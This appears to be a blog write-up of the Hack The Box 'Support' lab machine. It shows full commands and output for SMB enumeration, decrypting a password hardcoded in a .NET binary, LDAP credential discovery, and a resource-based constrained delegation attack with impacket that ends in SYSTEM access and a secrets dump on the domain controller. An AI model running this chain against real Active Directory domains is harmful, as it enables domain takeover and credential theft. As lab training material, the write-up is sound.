---
title: 'HTB Support - Easy'
date: 2024-05-08 20:00:00 +0000
categories: [HTB Machines]
tags: [Easy, Windows, HTB]
---

Support is an ‘easy’ HTB machine where you have to **decompile a .NET binary** and decrypt a password to get credentialed. From there, **enumeration via LDAP queries** led us to find a clear-text password in user attributes and move laterally. Privilege escalation to Domain Admins is possible due to **GenericAll permissions** over the DC$ machine account, performing a **Resource-Based Constrained Delegation attack**.

<img src="/assets/img/support/Untitled.png" alt="Untitled.png" style="width:600px;">

# Disclaimer

It’s fun because this was my second if not my first AD machine and it was a RBCD attack!!! I don’t think this machine should be in the TJNULL’s list for the OSCP preparation and I don’t recommend you to do it if you haven’t exploited unconstrained and constrained delegation before.

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.230.181

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.230.181 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 49664, 49667, 49678, 49681, 49764

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.230.181 -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49681,49764

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-08 19:20 WEST
Nmap scan report for 10.129.230.181
Host is up (0.074s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-08 18:21:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc         Microsoft Windows RPC
49764/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 11s
| smb2-time: 
|   date: 2024-05-08T18:21:53
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.37 seconds

[+] Script finished successfully
```

Appended the newly discovered hostname and domain to /etc/hosts.

```bash
echo -e "10.129.230.181\tsupport.htb DC.support.htb" | sudo tee -a /etc/hosts
10.129.230.181  support.htb DC.support.htb
```

**SMB anonymous login** is enabled and we have read permissions over a non-default share.

```bash
netexec smb 10.129.230.181 -u "anonymous" -p "" --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.181  445    DC               [+] support.htb\anonymous: 
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON                        Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL                          Logon server share
```

# Exploitation

The share contains a variety of files but only UserInfo.exe.zip seems relevant for us.

```bash
smbclient -N //10.129.230.181/support-tools -c ls                                 
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 12:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 12:19:55 2022
  putty.exe                           A  1273576  Sat May 28 12:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 12:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 18:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 12:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 12:19:43 2022
  
smbclient -N //10.129.230.181/support-tools -c "get UserInfo.exe.zip"   
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (482.2 KiloBytes/sec) (average 482.2 KiloBytes/sec)
```

We can decompress the ZIP file without providing a password. That being said, my working directory is now a mess.

```bash
unzip UserInfo.exe.zip 
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
	...
```

Used [ILSpy](https://github.com/icsharpcode/ILSpy) .NET decompiler to analyze the binary.

```bash
~/Desktop/tools/ilspy/ILSpy UserInfo.exe
```

Found an ‘LdapQuery’ class with a method that requests an authenticated LDAP connection to support.htb. From now, we got a new user called ldap.

<img src="/assets/img/support/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

Following the code flow, the Protected.getPassword() method contains an encrypted password and its decryption routine so this should be easy.

<img src="/assets/img/support/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

I am not a crypto bro so I will simply copy and execute a slightly modified version of the code in VS.

```csharp
using System.Text;

internal class ConsoleApp3
{
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static void getPassword()
    {
        byte[] array = Convert.FromBase64String(enc_password);
        byte[] array2 = array;
        for (int i = 0; i < array.Length; i++)
        {
            array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
        }
        string password = Encoding.Default.GetString(array2);
        Console.WriteLine($"\n[+] The password is: {password}. Tadaah!");
        Console.ReadLine();
    }

    public static void Main(string[] args)
    {
        getPassword();
    }
}
```

I’m sure you expected a cool Python script but I am not into cryptography rn.

<img src="/assets/img/support/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

NetExec confirms that the credentials are valid.

```bash
netexec smb 10.129.230.181 -u ldap -p '<REDACTED>' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.181  445    DC               [+] support.htb\ldap:<REDACTED> 
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL          READ            Logon server share
```

# Lateral Movement

Once authenticated, it is possible to query information about the domain via LDAP queries such as users, groups…

```bash
ldapsearch -x -H ldap://10.129.230.181 -b 'DC=support,DC=htb' -w '<REDACTED>' -D 'ldap@support.htb' "(ObjectClass=Person)" | grep -i samaccountname
sAMAccountName: Administrator
sAMAccountName: Guest
sAMAccountName: DC$
sAMAccountName: krbtgt
sAMAccountName: ldap
sAMAccountName: support
sAMAccountName: smith.rosario
sAMAccountName: hernandez.stanley
sAMAccountName: wilson.shelby
...
```

Listing users’ attributes led us to discover a clear-text password in support’s user info field. At this point I don’t know what to expect from an easy HTB machine XD.

```bash
ldapsearch -x -H ldap://10.129.230.181 -b 'DC=support,DC=htb' -w '<REDACTED>' -D 'ldap@support.htb' "(CN=support)"
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
uSNCreated: 12617
info: <REDACTED>
...
```

NetExec confirms that not only the credentials are valid but we also have PS Remote access.

```bash
netexec smb 10.129.230.181 -u support -p <REDACTED> --shares      
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.181  445    DC               [+] support.htb\support:<REDACTED>
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL          READ            Logon server share 
                                                                                                                                                                                             
netexec winrm 10.129.230.181 -u support -p <REDACTED>
WINRM       10.129.230.181  5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
WINRM       10.129.230.181  5985   DC               [+] support.htb\support:<REDACTED> (Pwn3d!)
```

Connected over WinRM and read the user flag.

```
evil-winrm -u support -p <REDACTED> -i 10.129.230.181

*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support

*Evil-WinRM* PS C:\Users\support\Documents> hostname
dc

*Evil-WinRM* PS C:\Users\support\Documents> type c:\users\support\desktop\user.txt
f4d44a3f51edf2f9****************
```

# PrivEsc

Executed [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) and analyzed the results.

```bash
bloodhound-python -u support -p <REDACTED> -d support.htb -c all -ns 10.129.230.181
```

The user we compromised is a member of a high privileged group that has GenericAll permissions over the Domain Controller machine account.

<img src="/assets/img/support/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">

Let’s check the machine account quota with NetExec.

```bash
netexec ldap 10.129.230.181 -u support -p <REDACTED> -M MAQ
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
LDAP        10.129.230.181  389    DC               [+] support.htb\support:<REDACTED>
MAQ         10.129.230.181  389    DC               [*] Getting the MachineAccountQuota
MAQ         10.129.230.181  389    DC               MachineAccountQuota: 10
```

MAQ is set to its default, meaning that we can add up to 10 machines to the domain.

```bash
impacket-addcomputer -computer-name dusk$ -computer-pass 'Dusk3d123!' -dc-ip 10.129.230.181 support.htb/support:<REDACTED>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Successfully added machine account dusk$ with password Dusk3d123!.
```

Once our machine has been created, we can grant it with **msds-allowedtodelegateto** over the DC$ machine account abusing the GenericAll permissions that the support’s user has.

```bash
impacket-rbcd "support.htb/support:<REDACTED>" -delegate-from "dusk$" -delegate-to "DC$" -dc-ip 10.129.230.181 -action write  
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] dusk$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     dusk$        (S-1-5-21-1677581083-3380853377-188903654-6101)
```

Now, request a **S4U ticket impersonating the administrator user** in the CIFS/DC.support.htb's SPN.

```bash
impacket-getST 'support.htb/dusk$:Dusk3d123!' -impersonate administrator -spn 'cifs/DC.support.htb'
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

All that is left is connecting to the Domain Controller as SYSTEM via Kerberos authentication and reading both flags.

```
KRB5CCNAME=administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache impacket-psexec support.htb/administrator@DC.support.htb -k -no-pass

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
dc

C:\Windows\system32> type c:\users\administrator\desktop\root.txt
6476c9769bab708c****************

C:\Windows\system32> type c:\users\support\desktop\user.txt
f4d44a3f51edf2f9****************
```

Another option would be to dump the administrator hash with a **DCSync attack**.

```bash
KRB5CCNAME=administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache impacket-secretsdump support.htb/administrator@DC.support.htb -k -no-pass
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:<REDACTED>:::
```

And connect over WinRM as local administrator in the DC. GGs!

```
evil-winrm -u administrator -H <REDACTED> -i 10.129.230.181       

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
support\administrator
```